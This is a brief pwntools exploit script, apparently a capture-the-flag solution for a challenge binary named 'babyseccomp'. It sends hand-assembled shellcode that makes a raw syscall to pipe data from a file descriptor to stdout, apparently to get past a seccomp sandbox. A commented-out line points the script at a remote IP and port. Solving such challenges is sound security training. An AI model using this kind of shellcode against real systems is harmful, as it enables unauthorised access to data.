from pwn import *

context.binary = ELF("./babyseccomp")

p = process("./babyseccomp")
#p = remote("115.68.235.72", 23457)

pay = asm("""
mov rax, 0x114
mov rdi, 3
mov rsi, 1
mov rdx, 20
mov r10, 0
syscall

""")

gdb.attach(p)
print(p.recvuntil(":"))
print(pay)
p.sendline(pay)
p.recvline()
